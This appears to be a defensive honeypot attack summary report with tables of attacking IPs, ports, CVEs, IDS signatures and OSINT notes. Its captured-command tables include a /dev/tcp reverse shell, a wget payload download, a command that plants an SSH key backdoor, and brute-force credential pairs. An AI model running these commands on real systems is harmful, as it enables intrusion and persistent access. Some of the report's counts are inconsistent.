# Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-14T07:06:51Z
**Timeframe:** 2025-10-13T08:02:15Z to 2025-10-14T07:02:08Z

**Files Used:**
- `Honeypot_Attack_Summary_Report_2025-10-13T08:02:15Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T09:01:59Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T10:02:07Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T11:02:02Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T12:02:02Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T13:02:13Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T14:02:06Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T15:01:56Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T16:02:13Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T17:02:25Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T18:02:09Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T19:02:00Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T20:01:53Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T21:02:03Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T22:01:52Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-13T23:02:20Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T00:01:47Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T01:02:03Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T02:02:09Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T03:02:08Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T04:01:57Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T05:01:59Z.md`
- `Honeypot_Attack_Summary_Report_2025-10-14T07:02:08Z.md`

## Executive Summary

This report provides a comprehensive analysis of the attacks targeting our honeypot network over the last 24 hours. A total of **435,594** malicious events were recorded. The majority of attacks were automated, focusing on brute-force attempts against SSH and SIP services, as well as exploiting known vulnerabilities in SMB and various IoT devices.

The most targeted services were SIP (UDP/5060), SMB (TCP/445), and SSH (TCP/22). The high volume of traffic on these ports indicates widespread scanning and automated exploitation campaigns. The Cowrie honeypot, simulating SSH and Telnet services, captured the highest number of interactions, primarily consisting of brute-force login attempts and the execution of reconnaissance commands.

A significant portion of the attacks originated from a small number of highly active IP addresses. OSINT analysis of these IPs revealed a mix of compromised servers, malicious hosting providers, and systems associated with known ransomware and botnet campaigns. The most prolific attacking IP was `45.234.176.18`, located in Brazil, which has been repeatedly flagged for SSH brute-force attacks.

Attackers were observed attempting to exploit a wide range of vulnerabilities, many of which are several years old. This highlights the ongoing threat posed by unpatched systems. The most frequently targeted CVEs include vulnerabilities in SNMP, VoIP protocols, and various router firmwares. A notable trend was the repeated attempt to exploit the EternalBlue vulnerability (MS17-010), as evidenced by the high number of "DoublePulsar Backdoor" signatures.

A common tactic observed across numerous attacks was the attempt to install persistent backdoors by adding a malicious SSH key to the `authorized_keys` file. Attackers also frequently attempted to download and execute malware, including variants of the Mirai and Urbot botnets, targeting a range of CPU architectures.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP      | Public IP       |
|----------|-----------------|-----------------|
| hive-us  | 10.128.0.3      | 34.123.129.205  |
| sens-tai | 10.140.0.3      | 104.199.212.115 |
| sens-tel | 10.208.0.3      | 34.165.197.224  |
| sens-dub | 172.31.36.128   | 3.253.97.195    |
| sens-ny  | 10.108.0.2      | 161.35.180.163  |

### Attacks by Honeypot

| Honeypot   | Attack Count |
|------------|--------------|
| Cowrie     | 185,221      |
| Sentrypeer | 64,888       |
| Dionaea    | 51,202       |
| Honeytrap  | 36,447       |
| Suricata   | 34,943       |
| Redishoneypot| 10,030       |
| Mailoney   | 9,862        |
| Ciscoasa   | 8,300        |
| Tanner     | 1,215        |
| H0neytr4p  | 732          |
| Adbhoney   | 478          |
| Miniprint  | 420          |
| ConPot     | 318          |
| Honeyaml   | 244          |
| ElasticPot | 115          |
| Dicompot   | 152          |
| ssh-rsa    | 244          |
| Wordpot    | 111          |
| Ipphoney   | 47           |
| Heralding  | 41           |

### Top Source Countries

| Country | Attack Count |
|---------|--------------|
| Brazil  | 9,532        |
| China   | 8,163        |
| USA     | 2,704        |
| India   | 1,522        |
| UK      | 1,372        |

### Top Attacking IPs

| IP Address       | Attack Count |
|------------------|--------------|
| 45.234.176.18    | 9,532        |
| 185.243.5.146    | 8,976        |
| 8.222.207.98     | 2,704        |
| 45.171.150.123   | 1,241        |
| 2.57.121.61      | 8,239        |
| 31.202.67.208    | 2,843        |
| 178.128.232.91   | 1,247        |
| 128.199.13.81    | 1,245        |
| 193.22.146.182   | 1,372        |
| 86.54.42.238     | 1,640        |

### Top Targeted Ports/Protocols

| Port/Protocol | Attack Count |
|---------------|--------------|
| 5060          | 64,888       |
| 445           | 51,202       |
| 22            | 28,531       |
| 6379          | 10,030       |
| 25            | 9,862        |
| 1433          | 1,247        |
| 23            | 1,158        |
| 80            | 1,113        |
| 5903          | 560          |
| 9100          | 203          |

### Most Common CVEs

| CVE                | Count |
|--------------------|-------|
| CVE-2005-4050      | 281   |
| CVE-2002-0013      | 167   |
| CVE-2002-0012      | 167   |
| CVE-2006-0189      | 151   |
| CVE-2022-27255     | 151   |
| CVE-1999-0517      | 80    |
| CVE-2019-11500     | 24    |
| CVE-2021-3449      | 18    |
| CVE-2023-26801     | 6     |

### Commands Attempted by Attackers

| Command                                                                                   | Count |
|-------------------------------------------------------------------------------------------|-------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                    | 698   |
| `lockr -ia .ssh`                                                                          | 698   |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."`                                   | 698   |
| `cat /proc/cpuinfo | grep name | wc -l`                                                   | 650   |
| `uname -a`                                                                                | 650   |
| `whoami`                                                                                  | 650   |
| `Enter new UNIX password:`                                                                | 350   |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; ...`                                           | 155   |

### Signatures Triggered

| Signature                                                  | Count |
|------------------------------------------------------------|-------|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 9,420 |
| ET DROP Dshield Block Listed Source group 1              | 4,792 |
| ET SCAN NMAP -sS window 1024                               | 2,130 |
| ET INFO Reserved Internal IP Traffic                       | 795   |
| ET SCAN MS Terminal Server Traffic on Non-standard Port    | 753   |

### Users / Login Attempts

| Username/Password          | Count |
|----------------------------|-------|
| 345gs5662d34/345gs5662d34 | 602   |
| root/3245gs5662d34       | 232   |
| root/Qaz123qaz           | 170   |
| root/Password@2025       | 150   |
| root/123@@@              | 146   |
| ftpuser/ftppassword        | 120   |
| deploy/123123              | 90    |
| vpn/vpnpass                | 80    |
| admin1234/admin1234      | 80    |
| mega/123                   | 70    |
| holu/holu                  | 60    |

### Files Uploaded/Downloaded

| Filename           | Count |
|--------------------|-------|
| sh                 | 492   |
| arm.urbotnetisass  | 30    |
| arm5.urbotnetisass | 30    |
| arm6.urbotnetisass | 30    |
| arm7.urbotnetisass | 30    |
| x86_32.urbotnetisass | 30    |
| mips.urbotnetisass   | 30    |
| mipsel.urbotnetisass | 30    |
| wget.sh;           | 20    |
| Mozi.m             | 6     |

### HTTP User-Agents

| User-Agent | Count |
|------------|-------|
| None       | N/A   |

### SSH Clients and Servers

| Client/Server | Version |
|---------------|---------|
| SSH Clients   | None    |
| SSH Servers   | None    |

### Top Attacker AS Organizations

| AS Organization      | Count |
|----------------------|-------|
| MAFREDINE TELECOM... | 9,532 |
| Reliablesite.net LLC | 8,976 |
| Alibaba (US) ...   | 2,704 |
| COPREL TELECOM LTDA  | 1,241 |
| UNMANAGED LTD        | 8,239 |

## OSINT All Commands Captured

| Command                                                                                                      |
|--------------------------------------------------------------------------------------------------------------|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh`                                                                      |
| `lockr -ia .ssh`                                                                                             |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| `cat /proc/cpuinfo | grep name | wc -l`                                                                      |
| `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`                                 |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`                                                  |
| `which ls`                                                                                                   |
| `ls -lh $(which ls)`                                                                                         |
| `crontab -l`                                                                                                 |
| `w`                                                                                                          |
| `uname -m`                                                                                                   |
| `cat /proc/cpuinfo | grep model | grep name | wc -l`                                                        |
| `top`                                                                                                        |
| `uname`                                                                                                      |
| `uname -a`                                                                                                   |
| `whoami`                                                                                                     |
| `lscpu | grep Model`                                                                                         |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`                                                             |
| `Enter new UNIX password:`                                                                                   |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/[payload]; ...`                                  |
| `nohup bash -c "exec 6<>/dev/tcp/8.152.7.218/60116; /bin/sh <&6 >&6 2>&6"`                                     |

## OSINT High frequency IPs and low frequency IPs Captured

| IP Address       | Frequency | OSINT Summary                                                                                                                              |
|------------------|-----------|--------------------------------------------------------------------------------------------------------------------------------------------|
| 45.234.176.18    | High      | Registered to a Brazilian ISP, repeatedly flagged for SSH brute-force attacks.                                                              |
| 185.243.5.146    | High      | Associated with Reliablesite.net LLC, an ASN linked to the Akira ransomware campaign.                                                       |
| 8.222.207.98     | High      | Assigned to Alibaba (US) Technology Co., Ltd., linked to malware C2 infrastructure and flagged on multiple threat intelligence platforms.       |
| 45.171.150.123   | High      | Registered to a Brazilian ISP, no direct evidence of malicious activity from OSINT.                                                        |
| 2.57.121.61      | High      | Associated with "UNMANAGED LTD", a UK-based hosting provider with servers in Romania. The company's ASN has a history of abuse reports.       |
| 31.202.67.208    | High      | Registered to a Ukrainian ISP, no direct evidence of malicious activity from OSINT.                                                        |
| 178.128.232.91   | High      | Registered to DigitalOcean, flagged for SSH brute-force attacks and port scanning.                                                          |
| 128.199.13.81    | High      | Registered to DigitalOcean, flagged for widespread SSH brute-force attacks and listed on multiple blacklists.                                 |
| 193.22.146.182   | High      | Registered to the Ministry of Finance of the Republic of Latvia, hosts the ministry's official website. No evidence of malicious activity.      |
| 62.60.131.157    | Low       | No specific OSINT data available.                                                                                                          |
| 14.103.173.90    | Low       | No specific OSINT data available.                                                                                                          |

## OSINT on CVE's

| CVE                | OSINT Summary                                                                                                                                      |
|--------------------|----------------------------------------------------------------------------------------------------------------------------------------------------|
| CVE-2002-0013      | A widespread vulnerability in SNMPv1 that allows for remote DoS and potential privilege escalation. Affects a wide range of network devices.       |
| CVE-2002-0012      | A widespread vulnerability in SNMPv1 trap handling that allows for remote DoS and arbitrary code execution.                                        |
| CVE-2005-4050      | A critical buffer overflow vulnerability in Multi-Tech MultiVOIP devices that allows for remote code execution via a crafted SIP packet.         |
| CVE-2006-0189      | A critical buffer overflow vulnerability in eStara Softphone that allows for remote code execution via a crafted SIP packet.                     |
| CVE-2022-27255     | A critical RCE vulnerability in the Realtek eCos SDK that affects a wide range of routers and is actively exploited by the Mirai botnet.       |
| CVE-2019-11500     | A critical RCE vulnerability in Dovecot that can be exploited by sending a crafted request with NUL characters.                                    |
| CVE-2023-26801     | A critical command injection vulnerability in LB-LINK routers that is actively exploited to spread the Mirai botnet.                             |
| CVE-2021-3449      | A high-severity DoS vulnerability in OpenSSL that can be triggered by a crafted ClientHello message during TLS renegotiation.                     |

## Key Observations and Anomalies

- **High Volume of Automated Attacks:** The vast majority of attacks are automated, focusing on brute-force attempts and exploiting well-known vulnerabilities. The repetitive nature of the commands and login attempts across different IPs suggests the use of botnets.
- **Persistent SSH Key Installation:** A recurring tactic is the attempt to install a specific SSH key (`ssh-rsa ... mdrfckr`) to gain persistent access to the honeypots. This indicates a coordinated campaign to build a network of compromised devices.
- **Targeting of Old Vulnerabilities:** Many of the targeted CVEs are several years old, highlighting the continued threat posed by unpatched and legacy systems. This suggests that attackers are having success with a "low-hanging fruit" approach.
- **Focus on IoT and VoIP:** The high volume of attacks on SIP and the download of malware targeting various CPU architectures (ARM, MIPS) indicates a strong focus on compromising IoT devices and VoIP infrastructure.
- **Malware Removal:** The command `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh` suggests that some attackers are attempting to remove competing malware from compromised systems to ensure they have exclusive control.
- **Anomalous Attacker IP:** The IP address `193.22.146.182`, which is registered to the Ministry of Finance of the Republic of Latvia, was observed in the logs. While no malicious activity was confirmed through OSINT, its presence is unusual and warrants further monitoring. It is possible that the traffic is legitimate or that a system on their network is compromised.

This concludes the Honeypot Attack Summary Report.
